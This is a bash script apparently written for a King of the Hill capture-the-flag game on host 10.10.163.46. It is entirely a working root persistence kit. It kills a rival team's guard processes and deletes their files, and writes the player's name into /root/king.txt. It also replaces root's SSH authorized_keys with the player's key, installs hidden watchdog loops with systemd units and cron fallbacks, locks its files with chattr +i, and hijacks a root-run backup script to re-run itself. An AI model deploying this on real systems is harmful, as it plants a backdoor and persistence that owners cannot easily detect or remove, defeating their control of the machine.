#!/bin/bash
# Root re-arm / fortify for 10.10.163.46
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
# instant strike: kill enemy loop and its respawn before anything else
pkill -9 -f 'koth[g]uard' 2>/dev/null
rm -f /etc/cron.d/kothguard /usr/local/bin/.kothguard /etc/systemd/system/kothguard.service 2>/dev/null
systemctl stop kothguard.service 2>/dev/null
systemctl mask kothguard.service 2>/dev/null
echo "$(date -u) RUN uid=$(id -u)" >> /home/serv3/backups/.ran 2>/dev/null
chmod 644 /home/serv3/backups/.ran 2>/dev/null
if [ "$0" != "/usr/local/sbin/.hillboot" ]; then
  cp -f "$0" /usr/local/sbin/.hillboot 2>/dev/null
  chmod 700 /usr/local/sbin/.hillboot 2>/dev/null
  chattr +i /usr/local/sbin/.hillboot 2>/dev/null
  exec /usr/local/sbin/.hillboot
fi
LOG=/root/.hill.log
KEY='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIECQX6tojENOvFjkH8PNBp7w5+L11wFdrg2Q0wo0oZZS koth-super.denchuk'
exec >>"$LOG" 2>&1
echo "=== $(date -u +%FT%TZ) hillboot start ==="

# unlock our artifacts for rewrite
chattr -i /usr/local/sbin/.hillguard /usr/local/sbin/.hillwatch /usr/local/sbin/.hillboot 2>/dev/null
chattr -i /etc/systemd/system/hillguard.service /etc/systemd/system/hillwatch.service 2>/dev/null
chattr -i /etc/cron.d/hillguard /etc/cron.d/hillwatch 2>/dev/null
chattr -i /home/serv3/backups/backup.sh 2>/dev/null

# 1. neutralise enemy supervisor
systemctl stop kothguard.service 2>/dev/null
systemctl disable kothguard.service 2>/dev/null
systemctl mask kothguard.service 2>/dev/null
pkill -9 -f 'koth_[d]etector' 2>/dev/null
pkill -9 -f 'koth[g]uard' 2>/dev/null
rm -f /etc/cron.d/kothguard /usr/local/bin/.kothguard /etc/systemd/system/kothguard.service /usr/local/bin/koth_detector.sh 2>/dev/null
rm -f /etc/sudoers.d/serv2 2>/dev/null
systemctl daemon-reload 2>/dev/null

# 2. king
chattr -i /root/king.txt 2>/dev/null
printf 'super.denchuk' > /root/king.txt
chattr +i /root/king.txt 2>/dev/null

# 3. key (ours only)
mkdir -p /root/.ssh
printf '%s\n' "$KEY" > /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys

# 4. sentry A
cat > /usr/local/sbin/.hillguard <<'GA'
#!/bin/bash
LOG=/root/.hill.log
KEY='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIECQX6tojENOvFjkH8PNBp7w5+L11wFdrg2Q0wo0oZZS koth-super.denchuk'
while :; do
  c=$(cat /root/king.txt 2>/dev/null)
  if [ "$c" != "super.denchuk" ]; then
    chattr -i /root/king.txt 2>/dev/null
    printf 'super.denchuk' > /root/king.txt
    chattr +i /root/king.txt 2>/dev/null
    echo "$(date -u +%FT%TZ) GUARD king restored was=[$c]" >> "$LOG"
  fi
  if [ "$(cat /root/.ssh/authorized_keys 2>/dev/null)" != "$KEY" ]; then
    mkdir -p /root/.ssh
    printf '%s\n' "$KEY" > /root/.ssh/authorized_keys
    chmod 700 /root/.ssh; chmod 600 /root/.ssh/authorized_keys
    echo "$(date -u +%FT%TZ) GUARD key restored" >> "$LOG"
  fi
  if pgrep -f 'koth_[d]etector|koth[g]uard' >/dev/null 2>&1; then
    pkill -9 -f 'koth_[d]etector' 2>/dev/null
    pkill -9 -f 'koth[g]uard' 2>/dev/null
    echo "$(date -u +%FT%TZ) GUARD killed enemy proc" >> "$LOG"
  fi
  if [ -e /etc/cron.d/kothguard ] || [ -e /usr/local/bin/.kothguard ] || [ -e /etc/systemd/system/kothguard.service ] || [ -e /usr/local/bin/koth_detector.sh ]; then
    rm -f /etc/cron.d/kothguard /usr/local/bin/.kothguard /etc/systemd/system/kothguard.service /usr/local/bin/koth_detector.sh 2>/dev/null
    echo "$(date -u +%FT%TZ) GUARD removed enemy artifacts" >> "$LOG"
  fi
  if [ "$(cat /home/serv3/backups/backup.sh 2>/dev/null)" != "#!/bin/bash
/usr/local/sbin/.hillboot" ]; then
    chattr -i /home/serv3/backups/backup.sh 2>/dev/null
    printf '#!/bin/bash\n/usr/local/sbin/.hillboot\n' > /home/serv3/backups/backup.sh
    chown root:root /home/serv3/backups/backup.sh 2>/dev/null
    chmod 755 /home/serv3/backups/backup.sh
    chattr +i /home/serv3/backups/backup.sh 2>/dev/null
    echo "$(date -u +%FT%TZ) GUARD restored rearm stub" >> "$LOG"
  fi
  if [ -e /etc/sudoers.d/serv2 ]; then
    rm -f /etc/sudoers.d/serv2
    echo "$(date -u +%FT%TZ) GUARD closed serv2 sudo vector" >> "$LOG"
  fi
  sleep 0.2
done
GA
chmod 700 /usr/local/sbin/.hillguard

# 5. sentry B
cat > /usr/local/sbin/.hillwatch <<'GB'
#!/bin/bash
LOG=/root/.hill.log
KEY='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIECQX6tojENOvFjkH8PNBp7w5+L11wFdrg2Q0wo0oZZS koth-super.denchuk'
while :; do
  if ! pgrep -f '/usr/local/sbin/.hillguard' >/dev/null 2>&1; then
    setsid /usr/local/sbin/.hillguard >/dev/null 2>&1 &
    echo "$(date -u +%FT%TZ) WATCH restarted guard" >> "$LOG"
  fi
  c=$(cat /root/king.txt 2>/dev/null)
  if [ "$c" != "super.denchuk" ]; then
    chattr -i /root/king.txt 2>/dev/null
    printf 'super.denchuk' > /root/king.txt
    chattr +i /root/king.txt 2>/dev/null
    echo "$(date -u +%FT%TZ) WATCH king restored was=[$c]" >> "$LOG"
  fi
  if [ "$(cat /root/.ssh/authorized_keys 2>/dev/null)" != "$KEY" ]; then
    printf '%s\n' "$KEY" > /root/.ssh/authorized_keys
    chmod 600 /root/.ssh/authorized_keys
    echo "$(date -u +%FT%TZ) WATCH key restored" >> "$LOG"
  fi
  sleep 0.5
done
GB
chmod 700 /usr/local/sbin/.hillwatch

# 6. systemd units
cat > /etc/systemd/system/hillguard.service <<'UA'
[Unit]
Description=Hill Sentry A
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/local/sbin/.hillguard
Restart=always
RestartSec=1

[Install]
WantedBy=multi-user.target
UA
cat > /etc/systemd/system/hillwatch.service <<'UB'
[Unit]
Description=Hill Sentry B
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/local/sbin/.hillwatch
Restart=always
RestartSec=1

[Install]
WantedBy=multi-user.target
UB
systemctl daemon-reload 2>/dev/null
systemctl enable hillguard.service hillwatch.service >/dev/null 2>&1
systemctl restart hillguard.service hillwatch.service >/dev/null 2>&1

# 7. cron fallback (filenames without dots)
printf '* * * * * root pgrep -f /usr/local/sbin/.hillguard >/dev/null 2>&1 || setsid /usr/local/sbin/.hillguard >/dev/null 2>&1\n' > /etc/cron.d/hillguard
printf '* * * * * root pgrep -f /usr/local/sbin/.hillwatch >/dev/null 2>&1 || setsid /usr/local/sbin/.hillwatch >/dev/null 2>&1\n' > /etc/cron.d/hillwatch
chown root:root /etc/cron.d/hillguard /etc/cron.d/hillwatch
chmod 600 /etc/cron.d/hillguard /etc/cron.d/hillwatch

# 8. lock artifacts
chattr +i /usr/local/sbin/.hillguard /usr/local/sbin/.hillwatch /usr/local/sbin/.hillboot 2>/dev/null
chattr +i /etc/systemd/system/hillguard.service /etc/systemd/system/hillwatch.service 2>/dev/null
chattr +i /etc/cron.d/hillguard /etc/cron.d/hillwatch 2>/dev/null
chattr +a /root/.hill.log 2>/dev/null

# 9. re-entry: root cron backup.sh -> .hillboot (immutable)
printf '#!/bin/bash\n/usr/local/sbin/.hillboot\n' > /home/serv3/backups/backup.sh
chown root:root /home/serv3/backups/backup.sh
chmod 755 /home/serv3/backups/backup.sh
chattr +i /home/serv3/backups/backup.sh 2>/dev/null

# 10. cleanup enemy leftovers
rm -f /home/serv3/.rs /tmp/rootbash /tmp/.rsh 2>/dev/null

{
  echo "STATUS at $(date -u +%FT%TZ)"
  id
  echo "KING=$(cat /root/king.txt 2>/dev/null)"
  echo "KEYS=$(cat /root/.ssh/authorized_keys 2>/dev/null)"
  echo "GUARDPID=$(pgrep -f /usr/local/sbin/.hillguard | tr '\n' ' ')"
  echo "WATCHPID=$(pgrep -f /usr/local/sbin/.hillwatch | tr '\n' ' ')"
  lsattr /root/king.txt /home/serv3/backups/backup.sh 2>&1
} > /tmp/.hill.status 2>&1
chmod 644 /tmp/.hill.status

echo "=== $(date -u +%FT%TZ) hillboot done ==="
